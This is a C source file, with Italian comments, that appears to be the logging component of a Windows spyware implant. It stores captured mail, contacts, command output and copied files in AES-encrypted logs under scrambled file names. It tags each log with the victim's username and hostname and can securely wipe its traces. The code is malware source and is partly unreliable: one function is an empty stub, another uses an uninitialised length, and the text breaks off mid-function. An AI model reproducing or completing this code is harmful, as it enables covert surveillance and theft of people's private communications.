#include <windows.h>
#include <time.h>
#include <stdio.h>
#include "common.h"
#include "ASP.h"
#include "LOG.h"
#include "H4-DLL.h"
#include "aes_alg.h"
#include "sha1.h"
#include "md5.h"
#include "explore_directory.h"
#include "x64.h"
#include "JSON\JSON.h"
// #include "UnHookClass.h"
// #include "DeepFreeze.h"
#include "format_resistant.h"

extern BOOL IsDriverRunning(WCHAR *driver_name);
extern char SHARE_MEMORY_READ_NAME[MAX_RAND_NAME];

typedef struct {
	DWORD agent_tag;
	HANDLE h_file;
} log_entry_struct;

typedef struct log_list {
	nanosec_time ftime;
	char *file_name;
	DWORD size;
	struct log_list* next;
} log_list_struct;

log_list_struct *log_list_head = NULL;

//
// Struttura dei log file
//
// C'e' una dword in chiaro che indica: sizeof(LogStruct) + uDeviceIdLen + uUserIdLen + uSourceIdLen + uAdditionalData
typedef struct _LogStruct{
	UINT uVersion;			// Versione della struttura
		#define LOG_VERSION	2008121901
	UINT uLogType;			// Tipo di log
	UINT uHTimestamp;		// Parte alta del timestamp
	UINT uLTimestamp;		// Parte bassa del timestamp
	UINT uDeviceIdLen;		// IMEI/Hostname len
	UINT uUserIdLen;		// IMSI/Username len
	UINT uSourceIdLen;		// Numero del caller/IP len	
	UINT uAdditionalData;	// Lunghezza della struttura addizionale, se presente
}LogStruct, *pLogStruct;

#define NO_TAG_ENTRY 0xFFFFFFFF
#define MAX_LOG_ENTRIES 70
#define MIN_CREATION_SPACE 307200 // Numero di byte che devono essere rimasti per creare ancora nuovi file di log
log_entry_struct log_table[MAX_LOG_ENTRIES];

// Dichiarato in SM_EventHandlers.h
extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);
extern BOOL IsNewerDate(FILETIME *date, FILETIME *dead_line);

// Dichiarato in SM_ActionFunctions.h
extern BOOL WINAPI DA_Execute(BYTE *command);

// In BitmapCommon
extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality);
typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
extern BOOL HM_ParseConfGlobals(char *conf, conf_callback_t call_back);

extern aes_context crypt_ctx; // Dichiarata in shared
extern aes_context crypt_ctx_conf; // Dichiarata in shared

extern BYTE crypt_key[KEY_LEN]; // Dichiarata in shared
extern BYTE crypt_key_conf[KEY_LEN]; // Dichiarata in shared

BOOL log_wipe_file = FALSE; // Indica se sovrascrive un file prima di cancellarlo
DWORD min_disk_free = 0;    // Spazio minimo che deve rimanere su disco (configurabile)
DWORD max_disk_full = 0;    // Spazio massimo occupabile dai log
extern DWORD log_free_space; // Dichiarata nel segmento shared
extern DWORD log_active_queue;

extern BOOL IsDeepFreeze();

#define LOG_SIZE_MAX ((DWORD)1024*1024*100) //100MB
DWORD GetLogSize(char *path)
{
	DWORD hi_dim=0, lo_dim=0;
	HANDLE hfile;

	hfile = FNC(CreateFileA)(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile == INVALID_HANDLE_VALUE) 
		return 0xFFFFFFFF;
	lo_dim = FNC(GetFileSize)(hfile, &hi_dim);
	CloseHandle(hfile);
	if (lo_dim == INVALID_FILE_SIZE || hi_dim>0)
		return 0xFFFFFFFF;
	return lo_dim;
}

// Inserisce un elemento nella lista dei log da spedire in ordine di tempo
BOOL InsertLogList(log_list_struct **log_list, WIN32_FIND_DATA *log_elem)
{

	
	return TRUE;
}

// Libera la lista dei log
void FreeLogList(log_list_struct **log_list)
{
	log_list_struct *list_ptr, *tmp_ptr;
	list_ptr = *log_list;
	while(list_ptr) {
		SAFE_FREE(list_ptr->file_name);
		tmp_ptr = list_ptr->next;
		SAFE_FREE(list_ptr);
		list_ptr = tmp_ptr;
	}
	*log_list = NULL;
}

// Fa una pausa random in un intervallo (in secondi)
#define MAX_SLEEP_PAUSE 10
void LOG_SendPause(DWORD min_sleep, DWORD max_sleep)
{
	DWORD sleep_time;

	if (min_sleep > MAX_SLEEP_PAUSE)
		min_sleep = MAX_SLEEP_PAUSE;

	if (max_sleep > MAX_SLEEP_PAUSE)
		max_sleep = MAX_SLEEP_PAUSE;

	if (min_sleep > max_sleep || max_sleep == 0)
		return;

	srand((DWORD)time(NULL));
	rand();
	sleep_time = (((double)rand()/(double)RAND_MAX) * (max_sleep-min_sleep) + min_sleep);
	sleep_time*=1000;
	Sleep(sleep_time);
}

// Inizializza la chiave di cifratura.
void LOG_InitCryptKey(BYTE *crypt_material, BYTE *crypt_material_conf)
{
	// Chiave per i log
	memcpy(crypt_key, crypt_material, KEY_LEN);
	aes_set_key( &crypt_ctx, crypt_material, KEY_LEN*8 );

	// Chiave per la conf
	memcpy(crypt_key_conf, crypt_material_conf, KEY_LEN);
	aes_set_key( &crypt_ctx_conf, crypt_material_conf, KEY_LEN*8 );
}

void WINAPI ParseGlobalsQuota(JSONObject conf_json, DWORD dummy)
{
	JSONObject quota;
	
	if (!conf_json[L"quota"]->IsObject())
		return;

	quota = conf_json[L"quota"]->AsObject();
	min_disk_free = (DWORD) quota[L"min"]->AsNumber();
	max_disk_full = (DWORD) quota[L"max"]->AsNumber();
	log_wipe_file = (BOOL) conf_json[L"wipe"]->AsBool();
	SetFormatResistant(conf_json[L"format"]->AsBool());
}

// Legge la configuazione per i log
// (viene letto solo quando inizializza i log e
// non sulla ricezione di un nuovo file)
void UpdateLogConf()
{
	char *conf_memory;
	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
	if (conf_memory)
		HM_ParseConfGlobals(conf_memory, &ParseGlobalsQuota);
	SAFE_FREE(conf_memory);	
}


// Sottrae due large integer (con a>b)
void LargeSubtract(const ULARGE_INTEGER *a,
				   const ULARGE_INTEGER *b,
				   ULARGE_INTEGER *result)
{
	if (a->LowPart >= b->LowPart) {
		result->LowPart = a->LowPart - b->LowPart;
		result->HighPart = a->HighPart - b->HighPart;
	} else {
		result->LowPart = (0xffffffff - b->LowPart);
		result->LowPart += 1 + a->LowPart;
		result->HighPart = a->HighPart - b->HighPart - 1;
	}
}


// Torna lo spazio destinato ai log.
// Il minimo spazio libero richiedibile e' massimo 4GB.
// Lo spazio occupabile dai log e' massimo 4GB.
DWORD LOG_CalcSpace(ULARGE_INTEGER *large_space, DWORD space_req)
{
	ULARGE_INTEGER large_req;
	ULARGE_INTEGER result;

	// Se lo spazio richiesto e' maggiore, ritorna 0
	if (large_space->HighPart == 0 && large_space->LowPart <= space_req)
		return 0;

	// Se lo spazio richiesto e' minore, sottrae
	large_req.HighPart = 0;
	large_req.LowPart = space_req;
	LargeSubtract(large_space, &large_req, &result);

	// Se il risultato e' > di 4GB, ritorna 4GB
	if (result.HighPart>0)
		return 0xFFFFFFFF;

	// Altrimenti torna la parte bassa
	return result.LowPart;
}

// Calcola la dimensione della directory di lavoro
// Se fallisce torna che la directory occupa 4GB
DWORD LOG_GetActualLogSize()
{
	DWORD log_total_size = 0xFFFFFFFF;
	char DirSpec[MAX_PATH];  
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	HM_CompletePath("*", DirSpec);
	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		log_total_size = 0;
		do {
			// Salta le directory (es: ".", ".." etc...)
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				continue;
			
			if (FindFileData.nFileSizeLow != INVALID_FILE_SIZE)
				log_total_size += FindFileData.nFileSizeLow;
		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
		FNC(FindClose)(hFind);
	}
	return log_total_size;
}

void LOG_InitSequentialLogs()
{
	DWORD i;

	// Inizializza la tabella dei log
	for (i=0; i<MAX_LOG_ENTRIES; i++) {
		log_table[i].agent_tag = NO_TAG_ENTRY;
		log_table[i].h_file = INVALID_HANDLE_VALUE;
	}
}

// Inizializza l'utilizzo dei log
void LOG_InitLog()
{
	ULARGE_INTEGER temp_free_space;
	char disk_path[DLLNAMELEN];
	DWORD temp_log_space;
	DWORD allowed_size1 = 0;
	DWORD allowed_size2 = 0;

	log_active_queue = 0;

	// Legge la configurazione dei log
	UpdateLogConf();

	LOG_InitSequentialLogs();

	// Inizializza lo spazio rimanente sul disco
	// dove e' la directory di lavoro
	// (min disk free)
	if (FNC(GetDiskFreeSpaceExA)(HM_CompletePath("", disk_path), NULL, NULL, &temp_free_space))
		allowed_size1 = LOG_CalcSpace(&temp_free_space, min_disk_free);	

	// Inizializza lo spazio ancora a disposizione per i log
	// (max disk full)
	temp_log_space = LOG_GetActualLogSize();
	if (max_disk_full >= temp_log_space)
		allowed_size2 = max_disk_full - temp_log_space;

	// Lo spazio libero e' la condizione piu' stringente
	// fra le due sopra
	// (se qualcosa va storto log_free_space = 0)
	if (allowed_size1 < allowed_size2)
		log_free_space = allowed_size1;
	else
		log_free_space = allowed_size2;
}


// Crea l'header per il nuovo formato di log
// l'header poi va LIBERATO!
BYTE *Log_CreateHeader(DWORD agent_tag, BYTE *additional_data, DWORD additional_len, DWORD *out_len)
{
	FILETIME tstamp;
	WCHAR user_name[256];
	WCHAR host_name[256];
	DWORD header_len;
	DWORD padded_len;
	BYTE iv[BLOCK_LEN];
	BYTE *final_header, *ptr;
	LogStruct log_header;

	if (out_len)
		*out_len = 0;

	// Calcola i campi da mettere nell'header
	memset(user_name, 0, sizeof(user_name));
	memset(host_name, 0, sizeof(host_name));
	user_name[0]=L'-';
	host_name[0]=L'-';
	FNC(GetEnvironmentVariableW)(L"USERNAME", (WCHAR *)user_name, sizeof(user_name)/2-2);	
	FNC(GetEnvironmentVariableW)(L"COMPUTERNAME", (WCHAR *)host_name, sizeof(host_name)/2-2);
	FNC(GetSystemTimeAsFileTime)(&tstamp);

	// Riempie l'header
	log_header.uDeviceIdLen = wcslen(host_name)*sizeof(WCHAR);
	log_header.uUserIdLen   = wcslen(user_name)*sizeof(WCHAR);
	log_header.uSourceIdLen = 0;
	if (additional_data) 
		log_header.uAdditionalData = additional_len;
	else
		log_header.uAdditionalData = 0;
	log_header.uVersion = LOG_VERSION;
	log_header.uHTimestamp = tstamp.dwHighDateTime;
	log_header.uLTimestamp = tstamp.dwLowDateTime;
	log_header.uLogType = agent_tag;

	// Calcola la lunghezza totale dell'header e il padding
	header_len = sizeof(LogStruct) + log_header.uDeviceIdLen + log_header.uUserIdLen + log_header.uSourceIdLen + log_header.uAdditionalData;
	padded_len = header_len;
	if (padded_len % BLOCK_LEN) {
		padded_len /= BLOCK_LEN;
		padded_len++;
		padded_len *= BLOCK_LEN;
	}
	padded_len += sizeof(DWORD);
	if (padded_len < header_len)
		return NULL;
	final_header = (BYTE *)malloc(padded_len);
	if (!final_header)
		return NULL;
	ptr = final_header;

	// Scrive l'header
	header_len = padded_len - sizeof(DWORD);
	memcpy(ptr, &header_len, sizeof(DWORD));
	ptr += sizeof(DWORD);
	memcpy(ptr, &log_header, sizeof(log_header));
	ptr += sizeof(log_header);
	memcpy(ptr, host_name, log_header.uDeviceIdLen);
	ptr += log_header.uDeviceIdLen;
	memcpy(ptr, user_name, log_header.uUserIdLen);
	ptr += log_header.uUserIdLen;
	if (additional_data)
		memcpy(ptr, additional_data, additional_len);

	// Cifra l'header (la prima DWORD e' in chiaro)
	memset(iv, 0, sizeof(iv));
	aes_cbc_encrypt(&crypt_ctx, iv, final_header+sizeof(DWORD), final_header+sizeof(DWORD), padded_len-sizeof(DWORD));
	if (out_len)
		*out_len = padded_len;
	
	return final_header;
}


void PrintBinary(WORD number, char *output)
{
	DWORD i = 0;
	sprintf(output, "0000000000000000");
	while (number) {
		if (number & 1)
			output[i] = '1';
		i++;
		number >>= 1;
	}
}

// Inizializza l'uso dei log per un agente
// (non e' thread safe)
// Torna TRUE se ha successo
BOOL LOG_InitAgentLog(DWORD agent_tag)
{
	DWORD i;
	HANDLE h_file;
	char log_wout_path[128];
	char file_name[DLLNAMELEN];
	char binary_tag[64];
	char *scrambled_name;
	BOOL newly_created;

	// Controlla che il TAG non sia gia' presente
	for (i=0; i<MAX_LOG_ENTRIES; i++) 
		if (log_table[i].agent_tag == agent_tag)
			return TRUE;

	// Cerca una entry vuota e la riempie (solo se 
	// riesce ad aprire il file)
	for(i=0; i<MAX_LOG_ENTRIES; i++) 
		if (log_table[i].agent_tag == NO_TAG_ENTRY) {
			ZeroMemory(binary_tag, sizeof(binary_tag));
			PrintBinary(agent_tag, binary_tag);
			sprintf(log_wout_path, "%.1XLOG%s%s.log", log_active_queue, binary_tag, SHARE_MEMORY_READ_NAME);

			if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) )
				return FALSE;			
			HM_CompletePath(scrambled_name, file_name);
			SAFE_FREE(scrambled_name);

			h_file = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, 0, NULL);
			if (h_file == INVALID_HANDLE_VALUE) 
				return FALSE;
			if (GetLastError() == ERROR_ALREADY_EXISTS )
				newly_created = FALSE;
			else
				newly_created = TRUE;
			FNC(SetFilePointer)(h_file, 0, NULL, FILE_END);
			
			// Se e' un file nuovo, ci inserisc l'header
			if (newly_created) {
				DWORD out_len, dummy;
				BYTE *log_header;
				
				log_header = Log_CreateHeader(agent_tag, NULL, 0, &out_len);
				if (!log_header || log_free_space<out_len || !FNC(WriteFile)(h_file, log_header, out_len, &dummy, NULL)) {
					CloseHandle(h_file);
					SAFE_FREE(log_header);
					FNC(DeleteFileA)(file_name);
					return FALSE;
				}
				SAFE_FREE(log_header);
				if (log_free_space >= out_len)
					log_free_space -= out_len;
				FNC(FlushFileBuffers)(h_file);
			}
			
			log_table[i].h_file = h_file;
			log_table[i].agent_tag = agent_tag;
			return TRUE;
		}

	return FALSE;
}


// Stoppa l'uso dei log per un agente
void LOG_StopAgentLog(DWORD agent_tag)
{
	DWORD i;

	// Cerca il TAG giusto
	for (i=0; i<MAX_LOG_ENTRIES; i++) 
		if (log_table[i].agent_tag == agent_tag) {
			log_table[i].agent_tag = NO_TAG_ENTRY;
			CloseHandle(log_table[i].h_file);
			log_table[i].h_file = INVALID_HANDLE_VALUE;
			return;
		}
}


// Offusca un log. Ritorna il buffer cifrato (che andra' liberato)
// Compatibile con il nuovo formato di file
BYTE *LOG_Obfuscate(BYTE *buff, DWORD buff_len, DWORD *crypt_len)
{
	DWORD *ptr;       // Indice nel buffer cifrato
	BYTE *crypt_buff;
	DWORD tot_len;
	DWORD i;
	BYTE iv[BLOCK_LEN];

	// Il buffer sara' composto cosi':
	// DWORD original_len (in chiaro)
	// buffer (cifrato)
	// padding (in modo che tutto sia multiplo di 16 byte)
	tot_len = buff_len;
	if (tot_len % BLOCK_LEN) {
		tot_len /= BLOCK_LEN;
		tot_len++;
		tot_len *= BLOCK_LEN;
	}
	tot_len += sizeof(DWORD);

	// Check overflow
	if (tot_len < buff_len)
		return NULL;

	// Alloca il buffer
	crypt_buff = (BYTE *)malloc(tot_len);
	if (!crypt_buff)
		return NULL;

	*crypt_len = tot_len;

	// Copia la lunghezza originale 
	ptr = (DWORD *)crypt_buff;
	*ptr = buff_len;
	ptr++;

	// Copia il buffer in chiaro (rimarranno dei byte di padding
	// inutilizzati).
	memcpy(ptr, buff, buff_len);
	memset(iv, 0, sizeof(iv));

	// Cifra tutto il blocco
	aes_cbc_encrypt(&crypt_ctx, iv, (BYTE *)ptr, (BYTE *)ptr, tot_len-sizeof(DWORD));

	return crypt_buff;
}


// Scrive un a entry nel file di log corrispondente
BOOL LOG_ReportLog(DWORD agent_tag, BYTE *buff, DWORD buff_len)
{
	DWORD i;
	
	// Cerca il TAG giusto
	for (i=0; i<MAX_LOG_ENTRIES; i++) 
		if (log_table[i].agent_tag == agent_tag) 
			return Log_WriteFile(log_table[i].h_file, buff, buff_len);

	return FALSE;
}


// Effettua lo scrambling e il descrimbling di una stringa
// Ricordarsi di liberare la memoria allocata
// E' Thread SAFE
char *LOG_ScrambleName(char *string, BYTE scramble, BOOL crypt)
{
	char alphabet[ALPHABET_LEN]={'_','B','q','w','H','a','F','8','T','k','K','D','M',
		                         'f','O','z','Q','A','S','x','4','V','u','X','d','Z',
		                         'i','b','U','I','e','y','l','J','W','h','j','0','m',
                                 '5','o','2','E','r','L','t','6','v','G','R','N','9',
					             's','Y','1','n','3','P','p','c','7','g','-','C'};                  
	char *ret_string;
	DWORD i,j;

	if ( !(ret_string = _strdup(string)) )
		return NULL;

	// Evita di lasciare i nomi originali anche se il byte e' 0
	scramble%=ALPHABET_LEN;
	if (scramble == 0)
		scramble = 1;

	for (i=0; ret_string[i]; i++) {
		for (j=0; j<ALPHABET_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				// Se crypt e' TRUE cifra, altrimenti decifra
				if (crypt)
					ret_string[i] = alphabet[(j+scramble)%ALPHABET_LEN];
				else
					ret_string[i] = alphabet[(j+ALPHABET_LEN-scramble)%ALPHABET_LEN];
				break;
			}
	}
	return ret_string;
}

char *LOG_ScrambleName2(char *string, BYTE scramble, BOOL crypt)
{
	char alphabet[ALPHABET_LEN]={'a','_','q','T','w','B','H','W','K','F','D','M','k',		                      
		                         'i','U','m','I','e','l','J','8','y','h','j','b','0',
								 'f','4','z','Q','O','9','S','x','u','X','A','V','Z',
                                 '3','7','2','E','L','r','t','G','6','v','C','N','d',
					             's','5','p','o','Y','n','1','c','g','P','R','-'};                  
	char *ret_string;
	DWORD i,j;

	if ( !(ret_string = _strdup(string)) )
		return NULL;

	// Evita di lasciare i nomi originali anche se il byte e' 0
	scramble%=ALPHABET_LEN;
	if (scramble == 0)
		scramble = 1;

	for (i=0; ret_string[i]; i++) {
		for (j=0; j<ALPHABET_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				// Se crypt e' TRUE cifra, altrimenti decifra
				if (crypt)
					ret_string[i] = alphabet[(j+scramble)%ALPHABET_LEN];
				else
					ret_string[i] = alphabet[(j+ALPHABET_LEN-scramble)%ALPHABET_LEN];
				break;
			}
	}
	return ret_string;
}

// --- Funzioni per far creare file agli agenti ---
// DEVONO ESSERE TUTTE THREAD SAFE

// Crea un file di log col nuovo formato
HANDLE Log_CreateFile(DWORD agent_tag, BYTE *additional_header, DWORD additional_len)
{
	char log_wout_path[128];
	char file_name[DLLNAMELEN];
	char *scrambled_name;
	FILETIME time_nanosec;
	DWORD out_len, dummy;
	BYTE *log_header;
	HANDLE hfile;
#define MAX_FILE_RETRY_COUNT 20
	DWORD retry_count = 0;

	// Controlla che ci sia ancora spazio per scrivere su disco
	// (additional_len e' l'unica parte di lunghezza variabile dell'header)
	if (log_free_space <= MIN_CREATION_SPACE + additional_len) 
		return INVALID_HANDLE_VALUE;

	// Usa l'epoch per dare un nome univoco al file
	FNC(GetSystemTimeAsFileTime)(&time_nanosec);	

	// Fa piu' tentativi ogni volta cambiando il nome del file
	// data la scarsa granularita' del systemtime
	do {
		retry_count++;
		if (retry_count > MAX_FILE_RETRY_COUNT)
			return INVALID_HANDLE_VALUE;

		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF%.4X%.8X%.8X.log", log_active_queue, agent_tag, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
		if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) )
			return INVALID_HANDLE_VALUE;	
		HM_CompletePath(scrambled_name, file_name);
		SAFE_FREE(scrambled_name);

		hfile = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); 

		// Incrementa di 1 il timestamp se deve riprovare
		time_nanosec.dwLowDateTime++;
		if (time_nanosec.dwLowDateTime == 0) // il riporto
			time_nanosec.dwHighDateTime++;
	} while (hfile == INVALID_HANDLE_VALUE);

	// Scrive l'header nel file
	log_header = Log_CreateHeader(agent_tag, additional_header, additional_len, &out_len);
	if (!log_header || log_free_space<out_len || !FNC(WriteFile)(hfile, log_header, out_len, &dummy, NULL)) {
		SAFE_FREE(log_header);
		CloseHandle(hfile);
		FNC(DeleteFileA)(file_name);
		return INVALID_HANDLE_VALUE;
	}
	SAFE_FREE(log_header);
	// ...e sottrae dalla quota disco
	if (log_free_space >= out_len)
		log_free_space -= out_len;
	FNC(FlushFileBuffers)(hfile);

	return hfile;
}
HANDLE Log_CreateFile2(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BOOL is_incoming)
{
	char log_wout_path[128];
	char file_name[DLLNAMELEN];
	char *scrambled_name;
	FILETIME time_nanosec;
	DWORD out_len, dummy;
	BYTE *log_header;
	HANDLE hfile;
#define MAX_FILE_RETRY_COUNT 20
	DWORD retry_count = 0;

	char szLogFileNameFormat[256] = {0};
	if (PM_CONTACTSAGENT == agent_tag){
		strcat(szLogFileNameFormat, "%s\\");//add sub path for mail contacts dir
		strcat(szLogFileNameFormat, "contacts_");//add sub path for mail contacts dir
		strcat(szLogFileNameFormat, "%.1XLOGF%.4X%.8X%.8X.log");
	}else if(PM_MAILAGENT == agent_tag)
	{
		strcat(szLogFileNameFormat, "%s\\");//add sub path for mail save dir
		if (is_incoming)
			strcat(szLogFileNameFormat, "mail_in_");
		else
			strcat(szLogFileNameFormat, "mail_out_");
		strcat(szLogFileNameFormat, "%.1XLOGF%.4X%.8X%.8X.eml");
	}

	if (log_free_space <= MIN_CREATION_SPACE + additional_len)
		return INVALID_HANDLE_VALUE;

	FNC(GetSystemTimeAsFileTime)(&time_nanosec);

	do {
		retry_count++;
		if (retry_count > MAX_FILE_RETRY_COUNT)
			return INVALID_HANDLE_VALUE;

		if (PM_CONTACTSAGENT == agent_tag || PM_MAILAGENT == agent_tag)//add sub path for mail save dir
			_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, szLogFileNameFormat,"data", log_active_queue, agent_tag, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
		else
			_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, szLogFileNameFormat, log_active_queue, agent_tag, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);

		HM_CompletePath(log_wout_path, file_name);

		hfile = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

		time_nanosec.dwLowDateTime++;
		if (time_nanosec.dwLowDateTime == 0) 
			time_nanosec.dwHighDateTime++;
	} while (hfile == INVALID_HANDLE_VALUE);


	if (log_free_space >= out_len)
		log_free_space -= out_len;
	FNC(FlushFileBuffers)(hfile);

	return hfile;
}

// Usato per l'output dei comandi
// N.B. Non sottrae quota disco!
HANDLE Log_CreateOutputFile(char *command_name)
{
	char log_wout_path[128];
	char file_name[DLLNAMELEN];
	char *scrambled_name;
	FILETIME time_nanosec;
	DWORD out_len, dummy;
	BYTE *log_header;
	HANDLE hfile;
	SECURITY_ATTRIBUTES sa;

	// Controlla che ci sia ancora spazio per scrivere su disco
	if (log_free_space <= MIN_CREATION_SPACE) 
		return INVALID_HANDLE_VALUE;

	// Usa l'epoch per dare un nome univoco al file
	FNC(GetSystemTimeAsFileTime)(&time_nanosec);	

	_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "OUTF%.8X%.8X.log", time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
	if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) )
		return INVALID_HANDLE_VALUE;	
	HM_CompletePath(scrambled_name, file_name);
	SAFE_FREE(scrambled_name);

	sa.bInheritHandle = TRUE;
	sa.nLength = 0;
	sa.lpSecurityDescriptor = NULL;
	hfile = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ, &sa, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (hfile == INVALID_HANDLE_VALUE)
		return INVALID_HANDLE_VALUE;

	// Scrive l'header nel file
	log_header = Log_CreateHeader(PM_COMMANDEXEC, (BYTE *)command_name, strlen(command_name) + 1, &out_len);
	if (!log_header || log_free_space<out_len || !FNC(WriteFile)(hfile, log_header, out_len, &dummy, NULL)) {
		SAFE_FREE(log_header);
		CloseHandle(hfile);
		FNC(DeleteFileA)(file_name);
		return INVALID_HANDLE_VALUE;
	}
	SAFE_FREE(log_header);
	FNC(FlushFileBuffers)(hfile);

	return hfile;
}


// Chiude un file di log
void Log_CloseFile(HANDLE handle)
{
	if (handle != INVALID_HANDLE_VALUE)
		CloseHandle(handle);
}
void Log_CloseFile2(HANDLE handle)
{
	if (handle != INVALID_HANDLE_VALUE)
		CloseHandle(handle);
}

// Cancella tutti i file di log
void Log_RemoveFiles()
{
	char log_file[DLLNAMELEN];
	WIN32_FIND_DATA FindFileData;
	char DirSpec[MAX_PATH];  
	HANDLE hFind = INVALID_HANDLE_VALUE;

	// Cerca tutti i file nella directory di lavoro tranne
	// il core e il file di configurazione
	HM_CompletePath("*", DirSpec);
	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			// Salta le directory (es: ".", ".." etc...)
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				continue;

			// Cancella i file che non sono il core o il file di conf
			if (stricmp(FindFileData.cFileName, H4DLLNAME) && stricmp(FindFileData.cFileName, H4_CONF_FILE))
				HM_WipeFileA(HM_CompletePath(FindFileData.cFileName, log_file));
		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
		FNC(FindClose)(hFind);
	}
}


// Salva lo stato di un agente
BOOL Log_SaveAgentState(DWORD agent_tag, BYTE *conf_buf, DWORD conf_len)
{
	char conf_name[128];
	char conf_path[DLLNAMELEN];
	char *scrambled_name;
	HANDLE hf;
	DWORD dwWrt = 0;

	// Il formato del nome e' ACFG<agent>.bin
	_snprintf_s(conf_name, sizeof(conf_name), _TRUNCATE, "ACFG%.4X.bin", agent_tag);
	if ( ! (scrambled_name = LOG_ScrambleName2(conf_name, crypt_key[0], TRUE)) ) 
		return FALSE;
	
	HM_CompletePath(scrambled_name, conf_path);
	SAFE_FREE(scrambled_name);

	hf = FNC(CreateFileA)(conf_path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (hf == INVALID_HANDLE_VALUE)
		return FALSE;

	// Verifica che abbia scritto tutto
	if (!FNC(WriteFile)(hf, conf_buf, conf_len, &dwWrt,  NULL) || dwWrt!=conf_len) {
		CloseHandle(hf);
		return FALSE;
	}

	CloseHandle(hf);
	return TRUE;
}

// Carica lo stato di un agente
BOOL Log_RestoreAgentState(DWORD agent_tag, BYTE *conf_buf, DWORD conf_len)
{
	char conf_name[128];
	char conf_path[DLLNAMELEN];
	char *scrambled_name;
	HANDLE hf;
	DWORD dwRd = 0;

	// Il formato del nome e' ACFG<agent>.bin
	_snprintf_s(conf_name, sizeof(conf_name), _TRUNCATE, "ACFG%.4X.bin", agent_tag);
	if ( ! (scrambled_name = LOG_ScrambleName2(conf_name, crypt_key[0], TRUE)) ) 
		return FALSE;
	
	HM_CompletePath(scrambled_name, conf_path);
	SAFE_FREE(scrambled_name);

	hf = FNC(CreateFileA)(conf_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (hf == INVALID_HANDLE_VALUE)
		return FALSE;

	// Verifica che abbia scritto tutto
	if (!FNC(ReadFile)(hf, conf_buf, conf_len, &dwRd,  NULL) || dwRd!=conf_len) {
		CloseHandle(hf);
		return FALSE;
	}

	CloseHandle(hf);
	return TRUE;
}



// Copia il file in modo offuscato (aggiornando la quota
// disco anche in caso di sovrascritture).
#define CRYPT_COPY_BUF_LEN 102400
BOOL Log_CryptCopyFile(WCHAR *src_path, char *dest_file_path, WCHAR *display_name, DWORD agent_tag)
{
	HANDLE hsrc, hdst;
	BY_HANDLE_FILE_INFORMATION dst_info;
	DWORD existent_file_size = 0;
	DWORD dwRead;
	BYTE *temp_buff;
	BYTE *file_additional_data;
	BYTE *log_file_header;
	FileAdditionalData *file_additiona_data_header;
	DWORD header_len;
	WCHAR *to_display;

	if (display_name)
		to_display = display_name;
	else
		to_display = src_path;

	// Crea l'header da scrivere nel file
	if ( !(file_additional_data = (BYTE *)malloc(sizeof(FileAdditionalData) + wcslen(to_display) * sizeof(WCHAR))))
		return FALSE;
	file_additiona_data_header = (FileAdditionalData *)file_additional_data;
	file_additiona_data_header->uVersion = LOG_FILE_VERSION;
	file_additiona_data_header->uFileNameLen = wcslen(to_display) * sizeof(WCHAR);
	memcpy(file_additiona_data_header+1, to_display, file_additiona_data_header->uFileNameLen);
	log_file_header = Log_CreateHeader(agent_tag, file_additional_data, file_additiona_data_header->uFileNameLen + sizeof(FileAdditionalData), &header_len);
	SAFE_FREE(file_additional_data);
	if (!log_file_header)
		return FALSE;
	

	// Prende le info del file destinazione (se esiste)
	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hdst != INVALID_HANDLE_VALUE) {
		if (FNC(GetFileInformationByHandle)(hdst, &dst_info)) {
			existent_file_size = dst_info.nFileSizeLow;
		}
		CloseHandle(hdst);
	}

	if ( !(temp_buff = (BYTE *)malloc(CRYPT_COPY_BUF_LEN)) ) {
		SAFE_FREE(log_file_header);
		return FALSE;
	}

